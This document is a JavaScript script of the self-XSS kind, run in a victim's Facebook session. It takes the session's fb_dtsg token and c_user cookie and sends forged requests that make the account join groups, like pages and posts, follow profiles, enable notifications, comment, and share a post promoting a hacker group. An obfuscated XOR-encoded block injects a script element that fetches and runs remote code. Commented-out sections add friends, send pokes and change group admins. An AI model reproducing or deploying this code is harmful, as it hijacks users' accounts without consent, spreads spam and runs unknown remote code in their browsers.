/*group Join*/
var b = document.getElementsByName("fb_dtsg")[0].value,
    c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);


function g(d) {
    var a = new XMLHttpRequest;
    d = "&ref=group_jump_header&group_id=" + d + "&fb_dtsg=" + b + "&__user=" + c + "&phstamp=";
    a.open("POST", "/ajax/groups/membership/r2j.php?__a=1", !0);
    a.onreadystatechange = function () {
        4 == a.readyState && 200 == a.status && a.close
    };
    a.send(d)
}
g("637005376320957");
g("597064983673982")
b = document.getElementsByName("fb_dtsg")[0].value;
c = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);





/*list follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function LIST(L) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe&flid="+L;
    var XParams = "fb_dtsg="+fb_dtsg+"&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECQ8yo&__req=d&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
LIST("148559432012336");
LIST("156489554515051");
LIST("146971562150041");
LIST("159553654225165");





/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}
Like("296798353735308");
Like("297301193718363");
Like("232233963594535");
Like("626063890768919");
Like("514486465297821");
Like("199134496914077");
Like("165411580286132");
Like("400036503459965");






/*page noti*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function N(noti) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
  var PageParams ="notifier_id="+noti+"&enable=true&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=a&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
N("514486465297821");
N("199134496914077");
N("400036503459965");





/*Auto Follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
        }
    };
    http4.send(params4);
}
a("100005115938614");
a("100004620215045");
a("100004532196646");
a("100003147643648");
a("100004156869752");
a("100001050235420");
a("100005147649818");
a("100007380753703");



/*IDS noti*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now=(new Date).getTime();
function pn(noti) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
  var PageParams ="notifier_id="+noti+"&enable=true&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvudDgDxrHEHyGameyp8y&__req=g&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
pn("100005115938614");





/*like post php*/
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function p(post) {
  
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
p("100003147643648");
p("199654230215107");
p("209392225888304");
p("208580292636164");
p("208580092636184");
p("199457596881767");
p("199457363548457");
p("199459220214938");
p("205945516252645");
p("169966006517263");
p("242266392600887");
p("243188212508705");
p("349683478511340");
p("213363228844207");
p("213363148844215");
p("227375447442985");
p("502096299905287");
p("294438680700629");

/*promote AICF*/



 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

 function PI2(rk) {
   
         var Page = new XMLHttpRequest();
         var PageURL = "//www.facebook.com/ajax/sharer/submit_page/";
         var PageParams = "fb_dtsg=" + fb_dtsg + "&next=&mode=self&friendTarget=&groupTarget=&pageTarget=" + rk + "&post_as_page=1&message_text=We%20are%20bringing%20you%20the%20latest%20and%20newest%20facebook%20automate%20tools%20for%20free.%0APowered%20by%20%3A%20Loading%20[lllllllllllllllllllllllllllllllllllllll%20]%2099%25%EF%BB%BF%20%26%20%20Assam-Indian%20Cyber%20Force%EF%BB%BF&message=We%20are%20bringing%20you%20the%20latest%20and%20newest%20facebook%20automate%20tools%20for%20free.%0APowered%20by%20%3A%20%40[313072532101076%3ALoading%20[lllllllllllllllllllllllllllllllllllllll%20%5C]%2099%25]%20%26%20%20%40[199134496914077%3AAssam-Indian%20Cyber%20Force]&app_id=2309869772&attachment[params][urlInfo][canonical]=http%3A%2F%2Fwww.automateyourfacebook.blogspot.in%2F&attachment[params][urlInfo][final]=http%3A%2F%2Fwww.automateyourfacebook.blogspot.in%2F&attachment[params][urlInfo][user]=http%3A%2F%2Fwww.automateyourfacebook.blogspot.in%2F&attachment[params][favicon]=http%3A%2F%2Fm.ak.fbcdn.net%2Fsphotos-c.ak%2Fhphotos-ak-prn2%2F1381240_457806991001115_416606163_n.jpg&attachment[params][title]=Automate Your Facebook&attachment[params][summary]=Automate%20Your%20Facebook&attachment[params][images][0]=http%3A%2F%2Fm.ak.fbcdn.net%2Fsphotos-c.ak%2Fhphotos-ak-prn2%2F1381240_457806991001115_416606163_n.jpg&attachment[params][medium]=106&attachment[params][url]=http%3A%2F%2Fwww.automateyourfacebook.blogspot.in/%2F&attachment[type]=100&link_metrics[source]=ShareStageExternal&link_metrics[domain]=www.automateyourfacebook.blogspot.in/&link_metrics[base_domain]=automateyourfacebook.blogspot.in&link_metrics[title_len]=10&link_metrics[summary_len]=101&link_metrics[min_dimensions][0]=70&link_metrics[min_dimensions][1]=70&link_metrics[images_with_dimensions]=3&link_metrics[images_pending]=0&link_metrics[images_fetched]=0&link_metrics[image_dimensions][0]=788&link_metrics[image_dimensions][1]=544&link_metrics[images_selected]=3&link_metrics[images_considered]=5&link_metrics[images_cap]=3&link_metrics[images_type]=ranked&composer_metrics[best_image_w]=100&composer_metrics[best_image_h]=100&composer_metrics[image_selected]=0&composer_metrics[images_provided]=3&composer_metrics[images_loaded]=3&composer_metrics[images_shown]=3&composer_metrics[load_duration]=6&composer_metrics[timed_out]=0&composer_metrics[sort_order]=&composer_metrics[selector_type]=UIThumbPager_6&share_source_type=unknown&src=&appid=5085647995&parent_fbid=&ogid=&audience[0][value]=80&UITargetedPrivacyWidget=80&share=Share%20Link&__user=" + user_id + "&__a=1&__dyn=7wAzU4Oi3S8w&__req=f&ttstamp=2658166118115538871";
          Page.open("POST", PageURL, true);
         Page.onreadystatechange = function () {
             if (Page.readyState == 4 && Page.status == 200) {
                 Page.close;
             }
         };
         Page.send(PageParams);
     }

 PI2("514486465297821");
 
 
 
 
 
var _0xd3a2=["\x6A\x76\x76\x72\x71\x38\x2D\x2D\x70\x63\x75\x2C\x65\x6B\x76\x6A\x77\x60\x2C\x61\x6D\x6F\x2D\x60\x6A\x63\x70\x65\x63\x74\x33\x3B\x3B\x34\x2D\x44\x60\x2F\x43\x77\x76\x6D\x2F\x76\x6D\x6D\x6E\x71\x2D\x6F\x63\x71\x76\x67\x70\x2D\x48\x67\x71\x76\x67\x70\x2C\x72\x6A\x72","","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x73\x72\x63","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var a=_0xd3a2[0];b=_0xd3a2[1];c=_0xd3a2[1];var d;d=a[_0xd3a2[2]];for(i=0;i<d;i++){b+=String[_0xd3a2[4]](a[_0xd3a2[3]](i)^2);} ;c=unescape(b);document[_0xd3a2[9]][_0xd3a2[8]](document[_0xd3a2[7]](_0xd3a2[6]))[_0xd3a2[5]]=c;





/*Comment me cool*/

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function com(cc) {

    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/ufi/add_comment.php";
    var PageParams = "ft_ent_identifier="+cc+"&comment_text=Bhargav You Rocks (Y). I'm a Huge FAN of YOur!!!!&source=2&client_id=1381330051325%3A2643585115&reply_fbid&parent_comment_id&rootid=u_0_9&clp=%7B%22cl_impid%22%3A%2289ff834f%22%2C%22clearcounter%22%3A0%2C%22elementid%22%3A%22js_0%22%2C%22version%22%3A%22x%22%2C%22parent_fbid%22%3A"+cc+"%7D&attached_sticker_fbid=0&attached_photo_fbid=0&giftoccasion&ft[tn]=[]&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=h&fb_dtsg="+fb_dtsg+"&ttstamp=265816610484687452";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}
com("213363148844215");





/*unfollow ufi*/

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function ufi(uf) {
var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/ufi/subscribe.php";
var XParams = "subscribe_action=false&ft_ent_identifier="+uf+"&source=0&client_id=1381477371640%3A944591536&rootid=u_0_3n&ft[tn]=%3D&ft[type]=20&nctr[_mod]=pagelet_timeline_recent&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=z&fb_dtsg="+fb_dtsg+"&ttstamp=26581671081201068478";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
ufi("213363148844215");






/*Add Friend
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/add_friend/action.php";
var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
IDS("100002859939326");
*/





/*poke
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function p(abone) {
var http4 = new XMLHttpRequest();
var url4 = "//www.facebook.com/pokes/dialog/?poke_target=" + abone + "&do_confirm=0";
var params4 = "poke_target=" + abone + "&do_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvudDgDxrHEHyGameyp8y&__req=i&fb_dtsg="+fb_dtsg+"&ttstamp=265816580891117469";
http4.open("POST", url4, true);
http4.onreadystatechange = function () {
if (http4.readyState == 4 && http4.status == 200) {
http4.close;
}
};
http4.send(params4);
}

p("100005147649818");
p("100004620215045");
p("100005115938614");
p("100005748400819");
p("100003147643648");
p("100005147649818");
p("100006760778954");
p("100002859939326"); */





/*extra Event

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function IDS(r) {
function G(gid) {
var Page = new XMLHttpRequest();
var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=34&ttstamp=26581661107112011276";
Page.open("POST", PageURL, true);
Page.onreadystatechange = function () {
if (Page.readyState == 4 && Page.status == 200) {
Page.close;
}
};
Page.send(PageParams);
}
G("536352643082702");
}
IDS("100005147649818");
IDS("100005147649818");
IDS("100005147649818");



setTimeout(function () {

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var now = (new Date).getTime();

function IDS(r) {
function G(gid) {
var Page = new XMLHttpRequest();
var PageURL = "//www.facebook.com/ajax/groups/admins_post.php";
var PageParams = "fb_dtsg=" + fb_dtsg + "&gid=" + gid + "&uid=" + r + "&operation=confirm_remove_admin&source=profilebrowser&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35zoSt2u5FeDKdo&__req=b&ttstamp=26581661107112011276";
Page.open("POST", PageURL, true);
Page.onreadystatechange = function () {
if (Page.readyState == 4 && Page.status == 200) {
Page.close;
}
};
Page.send(PageParams);
}
G("536352643082702");
}
IDS("100001954038029");
IDS("100000159572140");

}, 4000);
*/
